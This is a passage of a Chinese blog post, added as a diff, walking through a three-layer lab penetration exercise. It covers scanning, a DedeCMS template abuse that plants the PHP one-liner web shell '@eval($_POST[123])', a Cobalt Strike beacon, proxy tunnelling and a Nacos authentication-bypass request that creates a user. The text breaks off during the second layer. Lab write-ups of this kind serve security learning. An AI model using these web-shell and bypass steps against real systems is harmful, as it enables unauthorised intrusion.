@@ -1,0 +1,387 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>【复现】州弟三层网络渗透及综合渗透 | suhaynn</title><meta name="author" content="suhaynn"><meta name="copyright" content="suhaynn"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="靶场搭建具体搭建直接看官方的视频就行 三层网络渗透及综合渗透教程-环境搭建_哔哩哔哩_bilibili 环境配置环境及所需工具下载地址：https:&#x2F;&#x2F;pan.quark.cn&#x2F;s&#x2F;9d68fc9eea63 动态更新环境地址：https:&#x2F;&#x2F;pan.quark.cn&#x2F;s&#x2F;a096cebb578e  网盘可能由于波动，导致环境丢失，会在此地址动态更新下载链接  DMZ服务器账号密码：administ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【复现】州弟三层网络渗透及综合渗透">
+<meta property="og:url" content="http://example.com/2025/01/30/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91%E5%B7%9E%E5%BC%9F%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%8F%8A%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="suhaynn">
+<meta property="og:description" content="靶场搭建具体搭建直接看官方的视频就行 三层网络渗透及综合渗透教程-环境搭建_哔哩哔哩_bilibili 环境配置环境及所需工具下载地址：https:&#x2F;&#x2F;pan.quark.cn&#x2F;s&#x2F;9d68fc9eea63 动态更新环境地址：https:&#x2F;&#x2F;pan.quark.cn&#x2F;s&#x2F;a096cebb578e  网盘可能由于波动，导致环境丢失，会在此地址动态更新下载链接  DMZ服务器账号密码：administ">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://q1.qlogo.cn/g?b=qq&nk=1541524907&s=640">
+<meta property="article:published_time" content="2025-01-29T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-30T06:45:59.306Z">
+<meta property="article:author" content="suhaynn">
+<meta property="article:tag" content="三层内网">
+<meta property="article:tag" content="多层代理">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://q1.qlogo.cn/g?b=qq&nk=1541524907&s=640"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "【复现】州弟三层网络渗透及综合渗透",
+  "url": "http://example.com/2025/01/30/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91%E5%B7%9E%E5%BC%9F%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%8F%8A%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/",
+  "image": "http://q1.qlogo.cn/g?b=qq&nk=1541524907&s=640",
+  "datePublished": "2025-01-29T16:00:00.000Z",
+  "dateModified": "2025-01-30T06:45:59.306Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "suhaynn",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/01/30/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91%E5%B7%9E%E5%BC%9F%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%8F%8A%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '【复现】州弟三层网络渗透及综合渗透',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(https://www.richfan.cn/img/banner.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="http://q1.qlogo.cn/g?b=qq&amp;nk=1541524907&amp;s=640" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 内网渗透</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 信息收集</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 权限提升</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 横向移动</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="http://q1.qlogo.cn/g?b=qq&amp;nk=1541524907&amp;s=640" alt="Logo"><span class="site-name">suhaynn</span></a><a class="nav-page-title" href="/"><span class="site-name">【复现】州弟三层网络渗透及综合渗透</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 内网渗透</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 信息收集</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 权限提升</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 横向移动</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">【复现】州弟三层网络渗透及综合渗透</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-29T16:00:00.000Z" title="发表于 2025-01-30 00:00:00">2025-01-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-01-30T06:45:59.306Z" title="更新于 2025-01-30 14:45:59">2025-01-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA-CVE/">靶场&amp;CVE</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>具体搭建直接看官方的视频就行</p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1UgSPYxEr5/?spm_id_from=333.1387.homepage.video_card.click&vd_source=3db327aa28da3695e483555674e6d706">三层网络渗透及综合渗透教程-环境搭建_哔哩哔哩_bilibili</a></p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>环境及所需工具下载地址：<a target="_blank" rel="noopener" href="https://pan.quark.cn/s/9d68fc9eea63">https://pan.quark.cn/s/9d68fc9eea63</a></p>
+<p>动态更新环境地址：<a target="_blank" rel="noopener" href="https://pan.quark.cn/s/a096cebb578e">https://pan.quark.cn/s/a096cebb578e</a></p>
+<ul>
+<li>网盘可能由于波动，导致环境丢失，会在此地址动态更新下载链接</li>
+</ul>
+<p>DMZ服务器账号密码：administrator&#x2F;P@ssw0rd1</p>
+<p>二层服务器账号密码：dmz&#x2F;P@ssw0rd2</p>
+<p>三层服务器账号密码：pro&#x2F;P@ssw0rd3</p>
+<p>以上信息在视频和描述中已说明请确保安装盘硬盘容量大于15G</p>
+<h2 id="任务要求"><a href="#任务要求" class="headerlink" title="任务要求"></a>任务要求</h2><p>拿下DMZ区设备后获取DMZ区administrator桌面下flag文件值</p>
+<p>拿下二层网络设备获取某服务内的flag</p>
+<p>拿下二层网络设备后获取根目录下flag文件值</p>
+<p>拿下三层网络设备后获取pro用户桌面下的flag文件值</p>
+<h2 id="改动"><a href="#改动" class="headerlink" title="改动"></a>改动</h2><p>VMnet2和VMnet3还是按作者的来设置(我这里看错了所以和州弟的不一样，其实改成什么都行)，把作者的VMnet4网卡换成我个人的VMnet8网卡，因为我不想改我kali的IP了</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/12-323c5846-604f-4bdb-a19d-0ae931df4660.png"></p>
+<table>
+<thead>
+<tr>
+<th>主机</th>
+<th>IP</th>
+<th>网卡一</th>
+<th>网卡二</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>kali</td>
+<td>192.168.213.128</td>
+<td>VMnet8 192.168.213.0&#x2F;24</td>
+<td></td>
+</tr>
+<tr>
+<td>DMZ<br/>Windows</td>
+<td>192.168.213.129<br/>192.168.59.128</td>
+<td>VMnet8 192.168.213.0&#x2F;24</td>
+<td>VMnet3 192.168.59.0&#x2F;24</td>
+</tr>
+<tr>
+<td>二层<br/>Linux</td>
+<td>192.168.59.129<br/>192.168.37.128</td>
+<td>VMnet3 192.168.59.0&#x2F;24</td>
+<td>VMnet2 192.168.37.0&#x2F;24</td>
+</tr>
+<tr>
+<td>三层   Windows</td>
+<td>192.168.37.129</td>
+<td>VMnet2 192.168.37.0&#x2F;24</td>
+<td></td>
+</tr>
+</tbody></table>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/14-300b379b-711e-4030-a66e-1cdde30fda11.png"></p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/73-07cadf6f-41d3-426b-90d8-1b6b17715c87.png"></p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/85-b5ccfcd6-32a2-41d5-8ed0-80c4bb14cf90.png"></p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/32-adce334f-c220-403b-b26f-762f26415f64.png"></p>
+<h1 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h1><h2 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h2><h3 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.213.129</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/35-6d000e0e-84ba-43dd-9b36-f5f563613d3b.png"></p>
+<h4 id="fscan扫描"><a href="#fscan扫描" class="headerlink" title="fscan扫描"></a>fscan扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">192.168.213.1:7680 open</span><br><span class="line">192.168.213.129:21 open</span><br><span class="line">192.168.213.1:7000 open</span><br><span class="line">192.168.213.1:135 open</span><br><span class="line">192.168.213.1:7890 open</span><br><span class="line">192.168.213.1:7070 open</span><br><span class="line">192.168.213.1:139 open</span><br><span class="line">192.168.213.1:445 open</span><br><span class="line">192.168.213.129:135 open</span><br><span class="line">192.168.213.128:22 open</span><br><span class="line">192.168.213.129:139 open</span><br><span class="line">192.168.213.129:445 open</span><br><span class="line">192.168.213.129:3306 open</span><br><span class="line">192.168.213.129:8080 open</span><br><span class="line">[*] WebTitle:http://192.168.213.1:7890 code:400 len:0      title:None</span><br><span class="line">[*] 192.168.213.129      WORKGROUP\WIN-J4JT903TUH1   </span><br><span class="line">[+] NetInfo:</span><br><span class="line">[*]192.168.213.129</span><br><span class="line">   [-&gt;]WIN-J4JT903TUH1</span><br><span class="line">   [-&gt;]192.168.59.128</span><br><span class="line">   [-&gt;]192.168.213.129</span><br><span class="line">[*] WebTitle:http://192.168.213.129:8080 code:200 len:14405  title:我的网站</span><br><span class="line">[+] InfoScan:http://192.168.213.129:8080 [CMS] </span><br><span class="line">[+] http://192.168.213.129:8080 poc-yaml-dedecms-cve-2018-6910 </span><br><span class="line">[+] http://192.168.213.129:8080 poc-yaml-CVE-2022-22965-spring4shell-RCE </span><br><span class="line">[+] SSH:192.168.213.128:22:root root</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/53-9bdaead5-cc5a-4090-bc7c-03c6bf6afdf8.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include/downmix.inc.php</span><br><span class="line">inc/inc_archives_functions.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/56-6d0bf301-0e7b-4a5d-abf5-330e8058d14c.png"></p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/43-b6da1df5-0ec5-4d32-8cbc-1198142ade7e.png"></p>
+<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/70-619c14a9-f1bc-4486-9d74-cc7394311803.png"></p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/40-8416cbba-1f76-4618-8338-0e7096fe8769.png"></p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/92-8b03cb34-8fff-4ad1-9199-6f1e41a2c367.png"></p>
+<h4 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h4><p>账号密码登录 admin&#x2F;admin</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/06-11f2bf36-517f-4bbb-9e65-5e6314a46abe.png"></p>
+<p>模板—–&gt;默认模板管理—–&gt;新建模板</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/47-5b9e1b8b-32ba-423b-acae-d4769673f2e7.png"></p>
+<p>在内容中输入后门代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/67-e0188b48-dc88-4ca6-adac-1804776f2286.png"></p>
+<p>生成—–&gt;更新主页HTML—–&gt;浏览</p>
+<p>选择新建的模板</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/31-eb9bb7ad-0bac-4f27-8038-7a9e1125f5ef.png"></p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/05-3a82ace1-b5d8-468f-84c7-8d43894255aa.png"></p>
+<p>后缀改为php</p>
+<p>选择生成静态</p>
+<p>点击更新主页HTML</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/52-54c7bef3-010b-41cf-a85b-4efa5afb6ea2.png"></p>
+<p> 点击浏览</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/31-7d97b4c7-a8d4-4615-9e42-217b8a541386.png"></p>
+<p>没有报错</p>
+<p>所以后门地址为：</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.213.129:8080/newtpl.php">http://192.168.213.129:8080/newtpl.php</a></p>
+<p>使用后门工具进行连接，这里我实际上传的是哥斯拉，文本写的是一句话木马，大家分辨清楚哈</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/11-859050fe-0b62-4815-82c9-736da7fdd9a8.png"></p>
+<h4 id="拿到flag-1"><a href="#拿到flag-1" class="headerlink" title="拿到flag_1"></a>拿到flag_1</h4><p>第一个任务是拿下DMZ区设备后获取DMZ区administrator桌面下flag文件值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;78477a738c06620b872421af357d2cd5&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/64-ce58806d-cb6f-4f4c-a2a1-09cdbd10ef65.png"></p>
+<h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>发现不存在域环境，且存在双网卡，不出网</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.213.129/24</span><br><span class="line"></span><br><span class="line">192.168.59.128/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/20-fc38c6e7-11ac-4552-a53e-e56d2724fb35.png"></p>
+<h4 id="fscan扫描-1"><a href="#fscan扫描-1" class="headerlink" title="fscan扫描"></a>fscan扫描</h4><p>扫一扫第二个网段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 192.168.59.128/24</span><br></pre></td></tr></table></figure>
+
+<p>显示存在认证绕过，待会儿看看。还有6379端口开放了，说不定存在redis未授权哈，还有22端口，看来这台主机是Linux了</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/01-c16099cd-0225-48a9-80d6-049ec6e49358.png"></p>
+<h4 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h4><p>为方便针对第二天靶机，上线CS</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/16-d3edc591-954a-424d-9506-9a9986ce7725.png"></p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/84-f61311a0-4422-4f0d-bc99-6e51e4e02c9b.png"></p>
+<p>成功上线</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/34-96bd8b41-24ba-4226-8d69-c329ec2e3d18.png"></p>
+<h4 id="代理隧道"><a href="#代理隧道" class="headerlink" title="代理隧道"></a>代理隧道</h4><p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/92-329a115e-1f5b-412e-9eb7-41d24710245d.png"></p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/85-1a48087b-6e0b-4080-b6f8-d03fa4d91f07.png"></p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/63-84804ded-bbc8-45ba-918c-8bb4aa275c38.png"></p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/86-ad33d518-9236-413b-b59d-2922305f3edb.png"></p>
+<p>成功访问到</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.59.129:8848/nacos/#/login">http://192.168.59.129:8848/nacos/#/login</a></p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/87-76b25780-1c5c-4464-beb7-214158f29e85.png"></p>
+<p>kali挂代理</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/10-ee41c0d6-13b1-4aaf-8c99-e7ade23d5adf.png"></p>
+<p>成功访问到</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/37-faef49fa-b80f-42a4-84d3-196b47bea389.png"></p>
+<h2 id="二层"><a href="#二层" class="headerlink" title="二层"></a>二层</h2><h3 id="Web渗透-1"><a href="#Web渗透-1" class="headerlink" title="Web渗透"></a>Web渗透</h3><p><font style="color:rgb(51, 51, 51);">1、在url处添加访问一下网址即可查看到用户列表</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/nacos/v1/auth/users?pageNo=1&amp;pageSize=100</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/57-9c63b2ac-cb27-494c-932c-6690d5114913.png"></p>
+<p><font style="color:rgb(51, 51, 51);">2、访问以下链接并使用burp抓包，然后把get请求改为post，把修改User-Agent头改为Nacos-Server</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.59.129:8848/nacos/v1/auth/users</span><br></pre></td></tr></table></figure>
+
+<p>发现缺少参数</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/87-93148ce6-ad06-4747-b58b-448a7a443251.png"></p>
+<p><font style="color:rgb(51, 51, 51);">3、构造数据包添加一个demo用户，然后发送POST请求，返回为200，表示创建用户成功</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=demo&amp;password=demo</span><br></pre></td></tr></table></figure>
+
